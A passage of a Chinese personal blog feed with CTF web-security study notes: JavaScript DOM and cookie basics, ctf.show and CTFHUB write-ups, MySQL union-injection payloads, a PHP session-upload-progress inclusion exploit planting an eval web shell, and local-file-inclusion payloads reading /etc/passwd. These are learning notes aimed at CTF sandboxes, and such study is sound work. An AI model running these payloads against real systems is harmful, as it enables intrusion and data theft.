<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>alert()方法在JavaScript中表示弹出一个警告框，可以用来展示信息</strong></p>
</li>
</ul>
</blockquote>
<p>示例</p>
<blockquote>
  <div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       <span class="title function_">alert</span>(<span class="string">&#x27;id为intro元素的文本是：&#x27;</span>+x.<span class="property">innerHTML</span>);  </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<blockquote>
<p>修改一个HTML元素</p>
<ul>
<li><p>tep1：获取元素</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>tep2：获取元素内容</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</blockquote>
<p>示例</p>
<blockquote>
  <div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       x.<span class="property">innerHTML</span>=<span class="string">&#x27;HELLO WORLD!&#x27;</span>; </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<blockquote>
<p>将元素该为框架iframe框架</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;&lt;ifream src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifream&gt;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>动态创建HTML内容</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">Date</span>());<span class="comment">//向页面中写入当前时间</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;ifrema src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifrema&gt;&quot;</span>)<span class="comment">//向页面中写入框架</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>示例</p>
<blockquote>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span>kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">         Hello!敬请T期待</span><br><span class="line">     <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     	<span class="keyword">function</span> <span class="title function_">changetext</span>(<span class="params">id</span>)</span></span><br><span class="line"><span class="language-javascript">         &#123;</span></span><br><span class="line"><span class="language-javascript">             id.<span class="property">innerHTML</span>=<span class="string">&quot;Kingwempity@敬请T期待&quot;</span>;<span class="comment">//点击后变化的内容</span></span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;changetext(this)&quot;</span>&gt;</span></span><br><span class="line">         点我会发生变化o_o哦！</span><br><span class="line">     <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><blockquote>
<p>BOM:浏览器对象模型(Browser Object Model)</p>
</blockquote>
<blockquote>
<p>让浏览器来警告用户:</p>
<p>警告弹窗alert()</p>
<p>确认弹窗confirm()</p>
<p>提示弹窗prompt()</p>
<p>以上弹窗常用于简单的调试和信息展示。例如XSS漏洞测试</p>
</blockquote>
<blockquote>
<p>获取用户cookie（通常为浏览器发给用户客户端的一小段文本信息）</p>
<blockquote>
<p>常见场景：</p>
<p>用户输入用户名和密码成功登录网站后，网站会生成一个cookie给用户，当作用户凭证</p>
</blockquote>
<p>cookie一般在控制台的network或Application中可以查看</p>
<ul>
<li><p>获取Cookie</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//获取cookie</span></span><br></pre></td></tr></table></figure></div>


</li>
<li><p>修改写入Cookie</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">doucment.<span class="property">cookie</span>=<span class="string">&quot;写入值&quot;</span>#值的形式key=value</span><br></pre></td></tr></table></figure></div>


</li>
<li><p>显示cookie</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></div></li>
</ul>
</blockquote>
<blockquote>
<p>获取浏览器屏幕信息</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)screen</span><br></pre></td></tr></table></figure></div>



<p>获取&#x2F;控制用户页面的URL</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://kingwempity.github.io/&quot;</span><span class="comment">//控制当前页面url</span></span><br></pre></td></tr></table></figure></div>



<p>获取访问者浏览器信息</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)navigator</span><br></pre></td></tr></table></figure></div>



<p>操作浏览器窗口</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//打开页面</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//关闭页面</span></span><br></pre></td></tr></table></figure></div>



</blockquote>
<p>敬请T期待！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Web</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Open new world</title>
    <url>/2024/01/13/Open-new-world/</url>
    <content><![CDATA[<h2 id="OPEN-NEW-WORLD"><a href="#OPEN-NEW-WORLD" class="headerlink" title="OPEN NEW WORLD"></a>OPEN NEW WORLD</h2><p>敬请T期待！</p>
<p>路漫漫其修远兮，吾将上下而求索！</p>
<p>​																–《离骚》屈原</p>
<p>杨宪益先生 译：<br>The way was long, and wrapped in gloom did seem,<br>As I urged on to seek my vanished dream.</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Hope_flag</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf.show_web</title>
    <url>/2024/02/20/ctf-show-web/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="CTF-show秀"><a href="#CTF-show秀" class="headerlink" title="CTF.show秀"></a>CTF.show秀</h2><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_1.png" alt="ctf.show_web4_1"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_2.png" alt="ctf.show_web4_2"></p>
<blockquote>
<p>一个文件包含漏洞题目,<strong>日志注入</strong></p>
</blockquote>
<blockquote>
<p><u>使用include()函数接收url参数,include()函数包含的文件会被执行,从而造成任意代码执行,或者配合伪协议获取敏感文件甚至getshell;</u></p>
<p>本题伪协议不起作用,我们可以通过日志注入进行任意命令执行,从而getshell</p>
</blockquote>
<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_1.png" alt="ctf.show_web5_1"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_2.png" alt="ctf.show_web5_2"></p>
<blockquote>
<p>传递两个参数,一个字符串,一个数字,并且两个参数的md5值必须相同,我们可以利用<strong>md5的0e漏洞进行绕过</strong></p>
<p>通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p>
</blockquote>
<blockquote>
<p>0e绕过是指:0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;</p>
</blockquote>
<blockquote>
<ul>
<li><strong>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</strong></li>
<li><strong>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</strong></li>
</ul>
</blockquote>
<blockquote>
<p>两个md5值进行弱类型比较</p>
<blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>MD5加密后会变成这个样子</p>
<blockquote>
<p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854</p>
</blockquote>
<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p>
<blockquote>
<p>0&#x3D;&#x3D;0</p>
</blockquote>
<p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</p>
</blockquote>
<p><em><strong><u>常用的MD5加密后以0E开头的有</u></strong></em></p>
<blockquote>
<p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
</blockquote>
<h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
<hr>
<p>用burpsuit抓包,重放，将GET改成<strong>CTFHUB</strong>，发送即可获得flag</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png" alt="BURPSUIT"></p>
<p>falg</p>
<hr>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png" alt="flag"></p>
<hr>
<h3 id="信息页面隐藏"><a href="#信息页面隐藏" class="headerlink" title="信息页面隐藏"></a>信息页面隐藏</h3><hr>
<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_1.png" alt="CTFHUB_WEB_2_1" style="zoom: 80%;">

<p>看见页面信息繁杂，flag可能就隐藏在页面中，火狐快捷键*<u><strong>Ctrl+f</strong></u>*快捷查找，输入flag找到FLAG。</p>
<hr>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_2.png" alt="CTFHUB_WEB_2_2"></p>
<hr>
<h3 id="备份文件下载——网站源码"><a href="#备份文件下载——网站源码" class="headerlink" title="备份文件下载——网站源码"></a>备份文件下载——网站源码</h3><p><strong>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</strong></p>
<hr>
<blockquote>
<h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><hr>
<ul>
<li>tar</li>
<li>tar.gz</li>
<li>zip</li>
<li>rar</li>
</ul>
<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><hr>
<ul>
<li>web</li>
<li>website</li>
<li>backup</li>
<li>back</li>
<li>www</li>
<li>wwwroot</li>
<li>temp</li>
</ul>
</blockquote>
<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_1.png" alt="CTFHUB_WEB_3_1" style="zoom:50%;">

<p>文件下载，用python脚本，requests</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line"></span><br><span class="line">li1=[<span class="string">&quot;web&quot;</span>,<span class="string">&quot;website&quot;</span>,<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;back&quot;</span>,<span class="string">&quot;www&quot;</span>,<span class="string">&quot;wwwroot&quot;</span>,<span class="string">&quot;temp&quot;</span>]</span><br><span class="line">li2=[<span class="string">&quot; tar&quot;</span>,<span class="string">&quot;tar.gz&quot;</span>,<span class="string">&quot;zip&quot;</span>,<span class="string">&quot;rar&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url +<span class="string">&quot;/&quot;</span>+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Response [404]&gt;//1</span><br><span class="line">&lt;Response [404]&gt;//2</span><br><span class="line">&lt;Response [404]&gt;//3</span><br><span class="line">&lt;Response [404]&gt;//4</span><br><span class="line">&lt;Response [404]&gt;//5</span><br><span class="line">&lt;Response [404]&gt;//6</span><br><span class="line">&lt;Response [404]&gt;//7</span><br><span class="line">&lt;Response [404]&gt;//8</span><br><span class="line">&lt;Response [404]&gt;//9</span><br><span class="line">&lt;Response [404]&gt;//10</span><br><span class="line">&lt;Response [404]&gt;//11</span><br><span class="line">&lt;Response [404]&gt;//12</span><br><span class="line">&lt;Response [404]&gt;//13</span><br><span class="line">&lt;Response [404]&gt;//14</span><br><span class="line">&lt;Response [404]&gt;//15</span><br><span class="line">&lt;Response [404]&gt;//16</span><br><span class="line">&lt;Response [404]&gt;//17</span><br><span class="line">&lt;Response [404]&gt;//18</span><br><span class="line">&lt;Response [200]&gt;//[200]19</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br></pre></td></tr></table></figure></div>

<p>得到备份文件”<a class="link" href="http://www.zip/">www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwww.zip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%BE%97%E5%88%B0%E5%8E%8B%E7%BC%A9%E5%8C%85www.zip%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip直接访问www.zip下载，得到压缩包www.zip，解压打开文件，如图： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_2.png" alt="CTFHUB_WEB_3_2"></p>
<p>打开flag文件，发现没有flag</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
<p>直接用</p>
<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
<p><strong>弱口令</strong></p>
<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
</blockquote>
<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
<p>开启burp代理</p>
<p>登录信息随便填，抓到request请求如下</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CTF</tag>
        <tag>ctf.show</tag>
      </tags>
  </entry>
  <entry>
    <title>webctf</title>
    <url>/2024/03/13/webctf/</url>
    <content><![CDATA[<h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
<p><strong>爆库：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,database();#查看此处有多字段</span><br></pre></td></tr></table></figure></div>

<p><strong>爆表：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #   </span><br></pre></td></tr></table></figure></div>

<p><strong>爆字段：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot;; # </span><br></pre></td></tr></table></figure></div>

<p><strong>爆值：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,字段 from 表名; #   </span><br></pre></td></tr></table></figure></div>

<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>实战例子：</p>
<p>CTFshow&#x2F; easy_include</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>代码解释：</p>
<blockquote>
<p>观察cookie，发现自动开启了session，直接session文件包含</p>
<p>如果能获取PHPSESSID<br>    “请求 Cookie”: {<br>        <strong>“PHPSESSID”: “a5c4fd8ef729d435160c08a37d20ed7a”</strong><br>    }</p>
</blockquote>
<p>EXP:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;localhost/tmp/sess_ctfshow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /flag_is_here.txt&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>



<h1 id="php文件漏洞"><a href="#php文件漏洞" class="headerlink" title="php文件漏洞"></a>php文件漏洞</h1><p><strong>get方式查看文件漏洞</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/etc/passwd  </span><br><span class="line">#GET /?url=/etc/passwd HTTP/1.1</span><br><span class="line">#若出现大串文件，则有文件漏洞</span><br><span class="line">#($_GET[&#x27;url&#x27;])极有可能含有文件漏洞</span><br></pre></td></tr></table></figure></div>

<p><strong>使用php协议</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://input</span><br><span class="line">#GET /?url=php://input HTTP/1.1</span><br><span class="line">#可以访问请求的原始数据的只读流;</span><br><span class="line">#enctype=&quot;multipart/form-data&quot;的时候php://input是无效的;</span><br><span class="line"></span><br><span class="line">?url=php://output</span><br><span class="line">#GET /?url=php://output HTTP/1.1</span><br><span class="line">#一个只写的数据流，允许以print和echo一样的方式写入到输出缓冲区</span><br><span class="line"></span><br><span class="line">?url=php://fd</span><br><span class="line">#GET /?url=php://fd HTTP/1.1</span><br><span class="line">#允许直接访问指定的文件描述符。例如：php://fd/3引用了文件描述符3.</span><br></pre></td></tr></table></figure></div>

<p><strong>查看PHP下的文夹使用ls</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>查看php下的文件夹中的文件内容cat</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat 文件夹名称&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>查看文件日志的文件夹</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure></div>



